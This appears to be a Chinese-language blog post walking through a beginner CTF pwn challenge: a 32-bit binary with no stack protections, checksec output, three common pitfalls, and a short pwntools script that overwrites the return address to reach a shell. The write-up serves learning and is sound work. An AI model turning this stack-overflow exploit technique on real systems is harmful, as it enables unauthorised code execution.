---
title: 一道 CTF：从栈溢出到拿到 shell
date: 2026-07-02
summary: pwn 入门题的完整思路，附我踩过的三个坑
category: 网安
tags: CTF
---

# 一道 CTF：从栈溢出到拿到 shell

题目很小：一个 32 位 ELF，输入一个名字，回你一句 hello。但 `checksec` 一看，什么都没开——没有 canary，没有 PIE，NX 关着。

## 先看清程序长什么样

```
$ checksec ./hello
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

这意味着三件事：栈可执行、地址固定、溢出不会被发现。

## 三个坑

1. **offset 算错**：`cyclic` 生成的字符串长度要够，少 4 个字节就会在返回地址里错位
2. **字节序**：`p32(addr)` 是必须的，手写字符串会变成反的
3. **shell 起来但没有输出**：本地能打通、远程不行，多半是没加 `cat flag`，或者 stdin 被关掉了

## 用 pwntools 打通

```python
from pwn import *
p = process("./hello")
p.sendlineafter(b"name?", b"A"*44 + p32(0x08049022) + p32(0))
p.interactive()
```

44 是到返回地址的距离，后一个 `p32(0)` 是假的返回地址，只为了让栈对齐。

## 我学到的

CTF 的价值不在拿 flag，在于**把「我有一个猜想」变成「我验证了它」**。漏洞利用的每一步都要有证据：offset 是多少、地址对不对、payload 有没有真的执行到。

> 后来我拆真实固件的时候，用的就是这一套：先建立假设，再让它可复现。
